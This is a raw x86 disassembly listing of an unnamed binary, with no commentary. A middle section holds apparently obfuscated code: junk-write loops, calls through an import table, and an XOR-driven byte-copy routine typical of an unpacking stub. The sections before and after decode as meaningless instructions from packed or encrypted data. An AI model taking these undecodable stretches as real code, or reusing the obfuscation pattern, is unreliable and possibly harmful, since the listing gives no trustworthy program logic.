  4039ec:	sub    DWORD PTR [ecx],esi
  4039ee:	retf   
  4039ef:	jb     0x4039cb
  4039f1:	sbb    ah,BYTE PTR ds:0xbb280745
  4039f7:	mov    ecx,0x90eb758b
  4039fc:	add    al,0x51
  4039fe:	scas   eax,DWORD PTR es:[edi]
  4039ff:	stc    
  403a00:	rol    DWORD PTR [edi],0x4
  403a03:	outs   dx,BYTE PTR ds:[esi]
  403a04:	mov    al,BYTE PTR [ebp+0x1b10e64b]
  403a0a:	in     eax,0x82
  403a0c:	sbb    cl,BYTE PTR [esi+eiz*8]
  403a0f:	gs loop 0x4039f3
  403a12:	adc    bl,ah
  403a14:	sar    BYTE PTR [edx-0x80],1
  403a17:	(bad)  
  403a18:	dec    esp
  403a19:	sbb    BYTE PTR es:[edx],dh
  403a1c:	push   ebx
  403a1d:	push   es
  403a1e:	mov    dh,0x4e
  403a20:	push   eax
  403a21:	push   edi
  403a22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403a23:	or     eax,0xaa4da335
  403a28:	test   esi,ecx
  403a2a:	xchg   ecx,eax
  403a2b:	add    BYTE PTR [edi],0x69
  403a2e:	in     al,0xd3
  403a30:	data16 and al,0x57
  403a33:	clc    
  403a34:	pop    edx
  403a35:	mov    al,0x10
  403a37:	retf   
  403a38:	jne    0x403a40
  403a3a:	test   BYTE PTR [edi*4+0x796b439b],bl
  403a41:	scas   eax,DWORD PTR es:[edi]
  403a42:	cmp    al,0xac
  403a44:	sub    DWORD PTR [ebp+0x34],ebp
  403a47:	adc    edx,DWORD PTR [ecx+esi*1-0xbce327b]
  403a4e:	pop    ebx
  403a4f:	and    eax,0x78d0c918
  403a54:	adc    ecx,ebx
  403a56:	repnz shl DWORD PTR [ebx],cl
  403a59:	rcr    ebp,0xd3
  403a5c:	test   BYTE PTR [edx],ah
  403a5e:	jno    0x403ab3
  403a60:	lods   eax,DWORD PTR ds:[esi]
  403a61:	jae    0x4039ea
  403a63:	inc    ebp
  403a64:	dec    edx
  403a65:	jne    0x403a67
  403a67:	lods   eax,DWORD PTR ds:[esi]
  403a68:	mov    al,0x56
  403a6a:	loop   0x403a57
  403a6c:	out    0xbc,eax
  403a6e:	dec    ecx
  403a6f:	cmp    al,0xce
  403a71:	and    al,0x11
  403a73:	pop    ebx
  403a74:	pop    ebx
  403a75:	mov    edi,0xb4e8160
  403a7a:	sbb    BYTE PTR [ebx+0x3e0fc513],ah
  403a80:	add    ah,cl
  403a82:	call   0xd0195263
  403a87:	pop    ss
  403a88:	(bad)  
  403a89:	(bad)  
  403a8b:	sbb    DWORD PTR [edx],ebp
  403a8d:	inc    ebx
  403a8e:	lds    eax,FWORD PTR [esi-0x12]
  403a91:	sub    al,0xd1
  403a93:	and    eax,0x55770520
  403a98:	pop    ss
  403a99:	adc    cl,BYTE PTR [ebx+0x247d082e]
  403a9f:	and    ebx,eax
  403aa1:	pusha  
  403aa2:	test   BYTE PTR ds:0xd057e2b0,ah
  403aa8:	rcr    BYTE PTR [ecx],cl
  403aaa:	or     al,0x39
  403aac:	pop    esi
  403aad:	inc    ebp
  403aae:	mov    ds:0x5fca36df,eax
  403ab3:	retf   0xb185
  403ab6:	inc    esi
  403ab7:	lods   al,BYTE PTR ds:[esi]
  403ab8:	into   
  403ab9:	lea    edx,[ecx+0x17]
  403abc:	pop    ss
  403abd:	mov    bh,BYTE PTR ds:0x74dca106
  403ac3:	ror    BYTE PTR [edx+0x5e],0x55
  403ac7:	test   BYTE PTR [edi+0x6ea7c6d3],ah
  403acd:	test   DWORD PTR [eax+0x6fa102e3],ebp
  403ad3:	and    eax,0xe229e5b
  403ad8:	sbb    ecx,esi
  403ada:	loopne 0x403b1e
  403adc:	dec    esi
  403add:	xchg   ecx,eax
  403ade:	inc    ecx
  403adf:	mov    ecx,0x1acf4b66
  403ae4:	cmp    DWORD PTR [esp+ecx*1],esp
  403ae7:	mov    bh,0x89
  403ae9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403aea:	inc    ebx
  403aeb:	ror    ch,0xe9
  403aee:	mov    ebp,0xfeea2c8e
  403af3:	out    0xc1,eax
  403af5:	dec    eax
  403af6:	cmp    eax,0xad46e21d
  403afb:	xchg   BYTE PTR [eax+edi*1],dl
  403afe:	sbb    cl,BYTE PTR [ecx]
  403b00:	sbb    edx,edx
  403b02:	pop    ebx
  403b03:	mov    ah,BYTE PTR [ecx-0x9f24da0]
  403b09:	add    eax,0x9dd8cc69
  403b0e:	addr16 lahf 
  403b10:	icebp  
  403b11:	aaa    
  403b12:	push   esi
  403b13:	mov    BYTE PTR [eax-0x7cb80e00],cl
  403b19:	add    DWORD PTR [eax+ecx*1-0x70ff3213],esp
  403b20:	xchg   esi,eax
  403b21:	rol    DWORD PTR [ecx+ebp*1-0x48],1
  403b25:	cmp    DWORD PTR [eax],0x59
  403b28:	ins    DWORD PTR es:[edi],dx
  403b29:	call   0xe3a50107
  403b2e:	xor    cl,BYTE PTR [edi+0x7c]
  403b31:	sub    eax,0xddef98cc
  403b36:	xor    BYTE PTR [ebx],al
  403b38:	(bad)  
  403b39:	stos   DWORD PTR es:[edi],eax
  403b3a:	jp     0x403b0c
  403b3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b3d:	and    al,BYTE PTR [esi+0x2b]
  403b40:	mov    edi,0x440f192
  403b45:	ins    DWORD PTR es:[edi],dx
  403b46:	pop    eax
  403b47:	cmc    
  403b48:	adc    DWORD PTR [ebx],esi
  403b4a:	mov    edi,0xf0e10a08
  403b4f:	fsub   DWORD PTR [ebx-0x16]
  403b52:	push   0xf7330262
  403b57:	in     al,dx
  403b58:	out    dx,eax
  403b59:	and    DWORD PTR [eiz*4+0x2eee7b6],eax
  403b60:	imul   edx,DWORD PTR [ebx+0x8],0x1
  403b64:	ret    
  403b65:	xchg   esi,eax
  403b66:	sub    DWORD PTR [ebx],0xffffffd3
  403b69:	mov    bh,BYTE PTR [ecx-0x43282e01]
  403b6f:	dec    esi
  403b70:	inc    ecx
  403b71:	mov    dh,0x8d
  403b73:	push   0xfffffffd
  403b75:	jb     0x403ba8
  403b77:	sub    eax,0xede3d9e0
  403b7c:	fdivr  DWORD PTR [edx+0x277648a0]
  403b82:	mov    ebp,0xfbaf82ce
  403b87:	jbe    0x403ba3
  403b89:	xor    ecx,DWORD PTR [eax-0x53]
  403b8c:	ss xchg edi,eax
  403b8e:	mov    dl,0x7d
  403b90:	inc    eax
  403b91:	jl     0x403b20
  403b93:	sahf   
  403b94:	jne    0x403b22
  403b96:	imul   edx,DWORD PTR [ebp+0x3b0c5551],0xbe52fd64
  403ba0:	push   esp
  403ba1:	sbb    dh,bh
  403ba3:	add    al,0xf9
  403ba5:	ret    
  403ba6:	or     ch,BYTE PTR [edi-0x4ed204d4]
  403bac:	inc    esp
  403bad:	mov    eax,ds:0x1691f5d7
  403bb2:	repz test BYTE PTR [edx+edi*1-0x6095efef],0xd0
  403bbb:	not    edx
  403bbd:	cld    
  403bbe:	dec    edx
  403bbf:	into   
  403bc0:	retf   
  403bc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403bc2:	xchg   esp,eax
  403bc3:	iret   
  403bc4:	add    DWORD PTR [esi-0xaf11e3],ebx
  403bca:	fcomp  QWORD PTR ds:0x1800803d
  403bd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403bd1:	(bad)  
  403bd2:	dec    ebp
  403bd3:	xor    eax,0xcb6680ce
  403bd8:	xchg   esi,eax
  403bd9:	or     BYTE PTR [edi+eiz*1],ah
  403bdc:	pop    ebp
  403bdd:	mov    cl,0xa2
  403bdf:	out    0x95,eax
  403be1:	pushf  
  403be2:	and    dh,BYTE PTR [ebx]
  403be4:	cs jmp 0x9147051b
  403bea:	repz dec edi
  403bec:	mov    dh,0x6b
  403bee:	jmp    FWORD PTR [ebp+0x35]
  403bf1:	icebp  
  403bf2:	clc    
  403bf3:	icebp  
  403bf4:	push   edi
  403bf5:	push   edx
  403bf6:	xchg   DWORD PTR [edi-0x5b],edx
  403bf9:	sub    esp,DWORD PTR ss:[ebx]
  403bfc:	and    al,0xf8
  403bfe:	in     al,0xaa
  403c00:	cs inc ebx
  403c02:	outs   dx,BYTE PTR ds:[esi]
  403c03:	xchg   ecx,edi
  403c05:	sbb    esi,DWORD PTR [ecx+ebp*8]
  403c08:	sbb    eax,0x5069d927
  403c0d:	xor    al,0xc9
  403c0f:	aas    
  403c10:	mov    esp,0x5cd65bea
  403c15:	ret    
  403c16:	mov    ebx,0x48a43024
  403c1b:	scas   al,BYTE PTR es:[edi]
  403c1c:	lds    ecx,FWORD PTR [ebx+0x54491f78]
  403c22:	cmp    edx,edi
  403c24:	jo     0x403bca
  403c26:	dec    ebx
  403c27:	ficomp DWORD PTR [ecx]
  403c29:	loopne 0x403bdc
  403c2b:	sub    BYTE PTR [ecx+0x6c],0xa3
  403c2f:	adc    ecx,DWORD PTR [eax+0x3f]
  403c32:	ja     0x403c8d
  403c34:	stos   DWORD PTR es:[edi],eax
  403c35:	outs   dx,BYTE PTR ds:[esi]
  403c36:	call   0x1e7a:0xe51eb545
  403c3d:	sub    eax,0x79817d87
  403c42:	stos   BYTE PTR es:[edi],al
  403c43:	pop    ecx
  403c44:	imul   edx,DWORD PTR ds:[edx-0x1a],0xb67b5652
  403c4c:	icebp  
  403c4d:	xchg   BYTE PTR [edi-0x34],dh
  403c50:	cld    
  403c51:	retf   
  403c52:	call   0xc204304f
  403c57:	add    bl,ch
  403c59:	mov    ch,0x13
  403c5b:	not    bh
  403c5d:	inc    ecx
  403c5e:	inc    ebx
  403c5f:	mov    ebx,DWORD PTR [ebx+0x3167c641]
  403c65:	stos   DWORD PTR es:[edi],eax
  403c66:	inc    ebp
  403c67:	clc    
  403c68:	pop    esp
  403c69:	clc    
  403c6a:	scas   eax,DWORD PTR es:[edi]
  403c6b:	lahf   
  403c6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c6d:	add    al,0xaf
  403c6f:	imul   esp,DWORD PTR [edx-0x4b8bc34],0xb7e82757
  403c79:	jb     0x403c79
  403c7b:	push   ebx
  403c7c:	jp     0x403ce9
  403c7e:	rol    BYTE PTR [edx+0x33],1
  403c81:	enter  0x4d89,0x8
  403c85:	mov    ecx,DWORD PTR [ebp+0x8]
  403c88:	mov    edx,DWORD PTR [ebp+0x8]
  403c8b:	xor    ecx,eax
  403c8d:	imul   edx,edx,0x5708f5
  403c93:	add    ecx,esi
  403c95:	lea    ecx,[ebp+ecx*4-0x64]
  403c99:	mov    edi,DWORD PTR [ecx]
  403c9b:	add    edx,edi
  403c9d:	mov    DWORD PTR [ecx],edx
  403c9f:	mov    ecx,DWORD PTR [ebp+0x8]
  403ca2:	xor    ecx,eax
  403ca4:	add    ecx,esi
  403ca6:	jne    0x4018ed
  403cac:	mov    ecx,DWORD PTR [ebp-0x8]
  403caf:	xor    ecx,eax
  403cb1:	mov    eax,DWORD PTR [ebp+0x10]
  403cb4:	add    ecx,esi
  403cb6:	mov    DWORD PTR [eax],ecx
  403cb8:	pop    edi
  403cb9:	pop    esi
  403cba:	pop    ebx
  403cbb:	leave  
  403cbc:	ret    0xc
  403cbf:	push   ebp
  403cc0:	mov    ebp,esp
  403cc2:	mov    DWORD PTR ds:0x41d57c,0xf89c85b5
  403ccc:	pop    ebp
  403ccd:	mov    DWORD PTR ds:0x429000,0x2616
  403cd7:	jmp    0x41046f
  403cdc:	sbb    DWORD PTR ds:0x427018,edx
  403ce2:	mov    eax,0x80670b3f
  403ce7:	ret    
  403ce8:	push   ebp
  403ce9:	mov    ebp,esp
  403ceb:	sub    esp,0x10
  403cee:	mov    eax,0xf89c85b6
  403cf3:	mov    DWORD PTR ds:0x425004,0x1b
  403cfd:	cmp    DWORD PTR ds:0x425004,0x0
  403d04:	je     0x403d42
  403d0a:	cmp    DWORD PTR ds:0x425004,0x29
  403d11:	jne    0x403d26
  403d17:	push   DWORD PTR [ebp-0xc]
  403d1a:	push   DWORD PTR [ebp-0x1c]
  403d1d:	push   DWORD PTR [ebp-0x18]
  403d20:	call   DWORD PTR ds:0x421020
  403d26:	mov    edx,DWORD PTR ds:0x425004
  403d2c:	dec    edx
  403d2d:	mov    DWORD PTR ds:0x425004,edx
  403d33:	jmp    0x403cfd
  403d38:	xor    DWORD PTR ds:0x426018,0x7d7c
  403d42:	mov    DWORD PTR [ebp-0x4],eax
  403d45:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  403d4c:	and    DWORD PTR ds:0x428014,0x0
  403d56:	jmp    0x403d68
  403d5b:	mov    ecx,DWORD PTR ds:0x428014
  403d61:	inc    ecx
  403d62:	mov    DWORD PTR ds:0x428014,ecx
  403d68:	cmp    DWORD PTR ds:0x428014,0x1f
  403d6f:	jae    0x403db8
  403d75:	cmp    DWORD PTR ds:0x428014,0x4
  403d7c:	jne    0x403d93
  403d82:	push   DWORD PTR [ebp-0x18]
  403d85:	push   0x8961
  403d8a:	push   DWORD PTR [ebp-0x14]
  403d8d:	call   DWORD PTR ds:0x421028
  403d93:	cmp    DWORD PTR ds:0x428014,0x3
  403d9a:	jne    0x403dad
  403da0:	mov    ecx,DWORD PTR ds:0x428014
  403da6:	inc    ecx
  403da7:	mov    DWORD PTR ds:0x428014,ecx
  403dad:	jmp    0x403d5b
  403db2:	add    ecx,DWORD PTR ds:0x425000
  403db8:	mov    ecx,DWORD PTR [ebp-0x4]
  403dbb:	adc    DWORD PTR ds:0x426000,edi
  403dc1:	push   esi
  403dc2:	or     edx,esi
  403dc4:	mov    edx,0x7510893
  403dc9:	and    DWORD PTR ds:0x429014,0x0
  403dd3:	mov    esi,DWORD PTR ds:0x429014
  403dd9:	inc    esi
  403dda:	mov    DWORD PTR ds:0x429014,esi
  403de0:	cmp    DWORD PTR ds:0x429014,0x5
  403de7:	jne    0x403df8
  403ded:	push   0x41fedf
  403df2:	call   DWORD PTR ds:0x42102c
  403df8:	cmp    DWORD PTR ds:0x429014,0x4
  403dff:	jne    0x403e12
  403e05:	mov    esi,DWORD PTR ds:0x429014
  403e0b:	inc    esi
  403e0c:	mov    DWORD PTR ds:0x429014,esi
  403e12:	cmp    DWORD PTR ds:0x429014,0x15
  403e19:	jb     0x403dd3
  403e1f:	movzx  esi,BYTE PTR ds:0x429008
  403e26:	sub    DWORD PTR ds:0x42900c,esi
  403e2c:	xor    ecx,edx
  403e2e:	mov    esi,0x3272db
  403e33:	push   edi
  403e34:	sbb    edi,DWORD PTR ds:0x42601c
  403e3a:	mov    edi,DWORD PTR [ebp+0x10]
  403e3d:	add    ecx,esi
  403e3f:	mov    DWORD PTR ds:0x42700c,0x23cb
  403e49:	cmp    ecx,edi
  403e4b:	mov    DWORD PTR ds:0x425000,0x3f40
  403e55:	je     0x403f20
  403e5b:	mov    ecx,DWORD PTR [ebp-0x4]
  403e5e:	sub    edi,0x7e0f
  403e64:	mov    edi,DWORD PTR [ebp+0x10]
  403e67:	xor    eax,eax
  403e69:	xor    ecx,edx
  403e6b:	add    ecx,esi
  403e6d:	add    edi,0xfabdbef1
  403e73:	adc    eax,0xffffffff
  403e76:	xor    eax,0x0
  403e79:	mov    DWORD PTR [ebp-0xc],eax
  403e7c:	push   ebx
  403e7d:	xor    ebx,ebx
  403e7f:	xor    edi,0x8a29a123
  403e85:	mov    eax,ecx
  403e87:	add    eax,0xfabdbef1
  403e8c:	adc    ebx,0xffffffff
  403e8f:	xor    eax,0x8a29a123
  403e94:	xor    ebx,0x0
  403e97:	cmp    eax,edi
  403e99:	jne    0x403eb2
  403e9f:	cmp    ebx,DWORD PTR [ebp-0xc]
  403ea2:	je     0x403f1a
  403ea8:	jmp    0x403eb2
  403ead:	mov    esi,0x3272db
  403eb2:	mov    eax,DWORD PTR [ebp-0x4]
  403eb5:	mov    edi,DWORD PTR [ebp-0x8]
  403eb8:	xor    edi,edx
  403eba:	add    edi,esi
  403ebc:	mov    esi,DWORD PTR [ebp+0x8]
  403ebf:	imul   edi,ecx
  403ec2:	mov    ebx,DWORD PTR [ebp+0xc]
  403ec5:	xor    eax,edx
  403ec7:	add    eax,ecx
  403ec9:	mov    al,BYTE PTR [ebx+eax*1+0x3272db]
  403ed0:	mov    BYTE PTR [edi+esi*1],al
  403ed3:	mov    eax,DWORD PTR [ebp-0x8]
  403ed6:	mov    esi,DWORD PTR [ebp+0x10]
  403ed9:	xor    eax,edx
  403edb:	xor    ebx,ebx
  403edd:	add    esi,0xfabdbef1
  403ee3:	adc    ebx,0xffffffff
  403ee6:	lea    ecx,[ecx+eax*1+0x3272db]
  403eed:	xor    edi,edi
  403eef:	xor    esi,0x8a29a123
  403ef5:	xor    ebx,0x0
  403ef8:	mov    eax,ecx
  403efa:	add    eax,0xfabdbef1
  403eff:	adc    edi,0xffffffff
  403f02:	xor    eax,0x8a29a123
  403f07:	xor    edi,0x0
  403f0a:	cmp    eax,esi
  403f0c:	jne    0x403ead
  403f12:	cmp    edi,ebx
  403f14:	jne    0x403ead
  403f1a:	mov    eax,0xf89c85b5
  403f1f:	pop    ebx
  403f20:	pop    edi
  403f21:	pop    esi
  403f22:	leave  
  403f23:	ret    0xc
  403f26:	push   ebp
  403f27:	mov    ebp,esp
  403f29:	sub    esp,0x78
  403f2c:	adc    DWORD PTR ds:0x42601c,0x7e2b
  403f36:	push   ebx
  403f37:	push   esi
  403f38:	push   edi
  403f39:	push   0x1f
  403f3b:	sub    DWORD PTR ds:0x42601c,0x56d8
  403f45:	lea    eax,[ebp-0x78]
  403f48:	sbb    DWORD PTR ds:0x42801c,0x71f8
  403f52:	push   eax
  403f53:	add    DWORD PTR ds:0x429018,0x427000
  403f5d:	push   0x0
  403f5f:	sub    DWORD PTR ds:0x42501c,0x427004
  403f69:	call   DWORD PTR ds:0x421044
  403f6f:	push   0x97898797
  403f74:	and    DWORD PTR ds:0x426000,0x1a8d
  403f7e:	call   DWORD PTR ds:0x421010
  403f84:	and    DWORD PTR ds:0x42600c,0x0
  403f8e:	mov    ecx,DWORD PTR ds:0x42600c
  403f94:	inc    ecx
  403f95:	mov    DWORD PTR ds:0x42600c,ecx
  403f9b:	cmp    DWORD PTR ds:0x42600c,0x21
  403fa2:	jne    0x403fda
  403fa8:	push   0x67f5
  403fad:	push   0x706e
  403fb2:	push   DWORD PTR [ebp-0x1c]
  403fb5:	push   0x21f9
  403fba:	push   DWORD PTR [ebp-0x24]
  403fbd:	push   0x372d
  403fc2:	push   DWORD PTR [ebp-0x1c]
  403fc5:	push   0x6932
  403fca:	push   0x2439
  403fcf:	push   0x1248
  403fd4:	call   DWORD PTR ds:0x421030
  403fda:	cmp    DWORD PTR ds:0x42600c,0x1d
  403fe1:	jb     0x403f8e
  403fe7:	add    DWORD PTR ds:0x428010,ebx
  403fed:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  403ff4:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  403ffb:	or     DWORD PTR ds:0x42701c,0x426014
  404005:	mov    ecx,DWORD PTR [ebp-0x4]
  404008:	adc    eax,0xdaa
  40400d:	mov    ebx,0x7510893
  404012:	xor    DWORD PTR ds:0x427004,ebx
  404018:	xor    ecx,ebx
  40401a:	mov    eax,0x3272db
  40401f:	add    ecx,eax
  404021:	mov    DWORD PTR [ebp-0x1c],ecx
  404024:	and    DWORD PTR ds:0x428010,0x0
  40402e:	jmp    0x404040
  404033:	mov    ecx,DWORD PTR ds:0x428010
  404039:	inc    ecx
  40403a:	mov    DWORD PTR ds:0x428010,ecx
  404040:	cmp    DWORD PTR ds:0x428010,0x18
  404047:	jae    0x40406f
  40404d:	cmp    DWORD PTR ds:0x428010,0x20
  404054:	jne    0x40406a
  40405a:	push   0x42801c
  40405f:	push   0x7111
  404064:	call   DWORD PTR ds:0x421058
  40406a:	jmp    0x404033
  40406f:	mov    ecx,DWORD PTR [ebp+0x14]
  404072:	adc    DWORD PTR ds:0x426004,0x3b44
  40407c:	test   ecx,ecx
  40407e:	mov    DWORD PTR ds:0x425024,0xafb
  404088:	je     0x404096
  40408e:	mov    ecx,DWORD PTR [ebp+0x14]
  404091:	mov    ecx,DWORD PTR [ecx]
  404093:	mov    DWORD PTR [ebp-0x1c],ecx
  404096:	mov    ecx,0x7665
  40409b:	imul   edx,eax
  40409e:	or     DWORD PTR ds:0x429000,0x5016
  4040a8:	mov    esi,0x76532
  4040ad:	sbb    DWORD PTR ds:0x429008,0x6d64
  4040b7:	add    edx,ecx
  4040b9:	xchg   esi,ecx
  4040bb:	or     esi,DWORD PTR ds:0x427010
  4040c1:	mov    edi,0x54354
  4040c6:	sub    edx,edi
  4040c8:	xor    DWORD PTR ds:0x42600c,edi
  4040ce:	mov    ecx,DWORD PTR [ebp-0x4]
  4040d1:	xor    DWORD PTR ds:0x425008,0x2961
  4040db:	xor    ecx,ebx
  4040dd:	mov    DWORD PTR ds:0x42601c,0x16
  4040e7:	cmp    DWORD PTR ds:0x42601c,0x0
  4040ee:	je     0x404130
  4040f4:	cmp    DWORD PTR ds:0x42601c,0x1d
  4040fb:	jne    0x404114
  404101:	push   0x425014
  404106:	push   0x426014
  40410b:	push   DWORD PTR [ebp-0x28]
  40410e:	call   DWORD PTR ds:0x42105c
  404114:	mov    esi,DWORD PTR ds:0x42601c
  40411a:	dec    esi
  40411b:	mov    DWORD PTR ds:0x42601c,esi
  404121:	jmp    0x4040e7
  404126:	sbb    DWORD PTR ds:0x425014,0x65a5
  404130:	add    ecx,eax
  404132:	mov    esi,DWORD PTR ds:0x425008
  404138:	sbb    DWORD PTR ds:0x426008,esi
  40413e:	mov    DWORD PTR [ebp-0x8],ecx
  404141:	sub    DWORD PTR ds:0x428010,edx
  404147:	mov    ecx,DWORD PTR [ebp-0x14]
  40414a:	mov    DWORD PTR ds:0x428008,0x2441
  404154:	xor    ecx,ebx
  404156:	add    ecx,eax
  404158:	mov    DWORD PTR [ebp-0x24],ecx
  40415b:	mov    ecx,DWORD PTR ds:0x42801c
  404161:	sbb    DWORD PTR ds:0x429004,ecx
  404167:	mov    ecx,DWORD PTR [ebp-0x4]
  40416a:	xor    ecx,ebx
  40416c:	mov    DWORD PTR ds:0x426000,0x1b
  404176:	cmp    DWORD PTR ds:0x426000,0x0
  40417d:	je     0x4041b9
  404183:	cmp    DWORD PTR ds:0x426000,0x22
  40418a:	jne    0x4041a3
  404190:	push   0x561f
  404195:	push   0x425014
  40419a:	push   DWORD PTR [ebp-0xc]
  40419d:	call   DWORD PTR ds:0x421034
  4041a3:	xor    esi,esi
  4041a5:	add    esi,DWORD PTR ds:0x426000
  4041ab:	dec    esi
  4041ac:	mov    DWORD PTR ds:0x426000,esi
  4041b2:	jmp    0x404176
  4041b7:	neg    esi
  4041b9:	add    ecx,eax
  4041bb:	adc    DWORD PTR ds:0x425014,edi
  4041c1:	mov    DWORD PTR [ebp-0x30],ecx
  4041c4:	or     DWORD PTR ds:0x426000,0x760b
  4041ce:	mov    esi,DWORD PTR [ebp-0x4]
  4041d1:	and    DWORD PTR ds:0x42700c,0x0
  4041db:	mov    ecx,DWORD PTR ds:0x42700c
  4041e1:	inc    ecx
  4041e2:	mov    DWORD PTR ds:0x42700c,ecx
  4041e8:	cmp    DWORD PTR ds:0x42700c,0x1f
  4041ef:	jne    0x404203
  4041f5:	push   DWORD PTR [ebp-0xc]
  4041f8:	push   0x7ec8
  4041fd:	call   DWORD PTR ds:0x421038
  404203:	cmp    DWORD PTR ds:0x42700c,0x13
  40420a:	jb     0x4041db
  404210:	xor    esi,ebx
  404212:	mov    DWORD PTR ds:0x426018,0x19
  40421c:	cmp    DWORD PTR ds:0x426018,0x0
  404223:	je     0x40427d
  404229:	cmp    DWORD PTR ds:0x426018,0xc
  404230:	jne    0x404251
  404236:	push   DWORD PTR [ebp-0x24]
  404239:	push   0x1686
  40423e:	push   0x428008
  404243:	push   DWORD PTR [ebp-0x28]
  404246:	push   0x2eb1
  40424b:	call   DWORD PTR ds:0x421000
  404251:	cmp    DWORD PTR ds:0x426018,0xd
  404258:	jne    0x40426b
  40425e:	mov    ecx,DWORD PTR ds:0x426018
  404264:	dec    ecx
  404265:	mov    DWORD PTR ds:0x426018,ecx
  40426b:	mov    ecx,DWORD PTR ds:0x426018
  404271:	dec    ecx
  404272:	mov    DWORD PTR ds:0x426018,ecx
  404278:	jmp    0x40421c
  40427d:	add    esi,eax
  40427f:	sub    DWORD PTR ds:0x428008,edx
  404285:	mov    ecx,DWORD PTR [ebp-0x24]
  404288:	or     DWORD PTR ds:0x429008,0x427008
  404292:	sub    ecx,eax
  404294:	jmp    0x4065e9
  404299:	div    ecx
  40429b:	and    DWORD PTR [edi+eax*1+0x64],edx
  40429f:	xchg   ebx,eax
  4042a0:	lods   eax,DWORD PTR ds:[esi]
  4042a1:	mov    edx,0x629c947b
  4042a6:	lods   eax,DWORD PTR ds:[esi]
  4042a7:	pop    esi
  4042a8:	clc    
  4042a9:	sbb    bl,BYTE PTR [edi+0x62]
  4042ac:	bound  ebp,QWORD PTR [edx]
  4042ae:	pop    edi
  4042af:	bound  esp,QWORD PTR [edx+0x52]
  4042b2:	add    DWORD PTR [edx],ebp
  4042b4:	add    eax,0x79283f0
  4042b9:	addr16 pop ds
  4042bb:	add    DWORD PTR ds:0x77a799b3,ebp
  4042c1:	jmp    0x30bf9a6c
  4042c6:	dec    ebx
  4042c7:	dec    ebx
  4042c8:	add    al,BYTE PTR [eax+ebp*4+0x61115068]
  4042cf:	cmp    DWORD PTR [ebx+0x25b73369],edx
  4042d5:	mov    ebx,0x442dd699
  4042da:	adc    eax,0xa7dad450
  4042df:	int3   
  4042e0:	je     0x4042d5
  4042e2:	jp     0x4042c0
  4042e4:	push   esi
  4042e5:	jb     0x40428d
  4042e7:	lock and eax,0x640ca8eb
  4042ed:	sub    eax,0xc5d54109
  4042f2:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  4042f4:	cmp    edi,DWORD PTR [ebx-0x998bf1]
  4042fa:	sbb    eax,0xee093cd5
  4042ff:	arpl   WORD PTR [ebx+0x46978a17],dx
  404305:	mov    ebp,0xd299e4c9
  40430a:	mov    dl,0x74
  40430c:	(bad)
  40430f:	xchg   dl,ch
  404311:	and    bl,dh
  404313:	add    eax,0xe6c96b28
  404318:	into   
  404319:	mov    bl,0x2a
  40431b:	or     BYTE PTR [edi-0x6afa7025],0xd3
  404322:	and    dh,dl
  404324:	pop    edx
  404325:	rep stos DWORD PTR es:[edi],eax
  404327:	push   esp
  404328:	div    DWORD PTR [esi]
  40432a:	mov    DWORD PTR [edi+ecx*4-0x5c948f30],edx
  404331:	jp     0x4042c6
  404333:	sti    
  404334:	sub    eax,0xf73d94d1
  404339:	adc    eax,0x323c3527
  40433e:	outs   dx,BYTE PTR ds:[esi]
  40433f:	mov    eax,ds:0x2fb5c05f
  404344:	stc    
  404345:	imul   edx,ebx,0xe32ee232
  40434b:	ins    BYTE PTR es:[edi],dx
  40434c:	imul   ecx,esp,0x223bcca6
  404352:	hlt    
  404353:	out    0xa5,al
  404355:	xchg   edx,eax
  404356:	push   eax
  404357:	div    DWORD PTR ss:[esi]
  40435a:	pop    esi
  40435b:	dec    edi
  40435c:	pop    ecx
  40435d:	sbb    DWORD PTR [esi],0x69
  404360:	jmp    0x9d16:0xd7b31ab2
  404367:	dec    edi
  404368:	cmp    BYTE PTR [edx+0x9],dl
  40436b:	xchg   edi,eax
  40436c:	push   esi
  40436e:	cmp    bh,BYTE PTR [esi+ebp*1-0x5b]
  404372:	pop    edx
  404373:	dec    edi
  404374:	arpl   WORD PTR [ebx-0x68],di
  404377:	neg    BYTE PTR [edi+0xb4211c5]
  40437d:	lock add edi,DWORD PTR ds:0x5522acee
  404384:	jg     0x4043a3
  404386:	jmp    0x9b65:0x343b7509
  40438d:	mov    ds:0x35e98760,eax
  404392:	push   es
  404393:	(bad)  
  404394:	fnsave [edx]
  404396:	jle    0x404351
  404398:	jmp    0x950a388b
  40439d:	aas    
  40439e:	or     BYTE PTR [ebx],0x6e
  4043a1:	sub    BYTE PTR [eax-0x3dc9db85],ch
  4043a7:	adc    eax,ebp
  4043a9:	test   eax,0x73d762ff
  4043ae:	push   ebx
  4043af:	(bad)  
  4043b0:	imul   ebp,ebp,0xffffffa2
  4043b3:	data16 or al,0xe
  4043b6:	clc    
  4043b7:	stos   DWORD PTR es:[edi],eax
  4043b8:	sbb    ebx,DWORD PTR [edi]
  4043ba:	int    0x9b
  4043bc:	fiadd  WORD PTR [ecx-0x2]
  4043bf:	push   ecx
  4043c0:	mov    bh,0xdf
  4043c2:	nop
  4043c3:	add    al,0x53
  4043c5:	fcmove st,st(6)
  4043c7:	add    al,0xbb
  4043c9:	stos   DWORD PTR es:[edi],eax
  4043ca:	sub    al,bh
  4043cc:	mov    cs,WORD PTR [esi+0x36215cda]
  4043d2:	cmp    eax,0xfbaa2e81
  4043d7:	xchg   edi,eax
  4043d8:	jb     0xf0269c99
  4043de:	xchg   esp,eax
  4043df:	fmul   DWORD PTR [eax+0x7bdc8252]
  4043e5:	(bad)  
  4043e6:	jno    0x40444a
  4043e8:	jmp    0x6198:0x6c1727d2
  4043ef:	js     0x404467
  4043f1:	xor    al,0x6b
  4043f3:	and    eax,0xd051002c
  4043f8:	cmp    eax,0xb626895a
  4043fd:	fld    st(7)
  4043ff:	xchg   esi,eax
  404400:	mov    BYTE PTR [ecx],ah
  404402:	sub    al,0x7a
  404404:	shl    edx,1
  404406:	out    0xe0,eax
  404408:	mov    dl,0x1d
  40440a:	xchg   DWORD PTR [ebp-0x25],ebx
  40440d:	in     al,dx
  40440e:	inc    ebx
  40440f:	mov    cl,0x33
  404411:	xchg   esp,eax
  404412:	ret    
